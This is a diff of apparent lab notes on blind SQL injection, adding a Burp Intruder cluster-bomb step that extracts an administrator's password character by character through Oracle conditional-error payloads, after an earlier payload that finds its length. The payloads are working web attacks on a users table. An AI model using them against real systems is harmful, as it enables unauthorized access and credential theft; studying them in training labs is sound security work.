@@ -45,6 +45,9 @@ Use burp intruder to automate
 '||(SELECT CASE WHEN length(password)>§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'
 The password length is 20. Got '200 OK' at 19
 
+Finding all the characters of the password
+Use cluster bomb attack
+'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator')||'
 
 
 
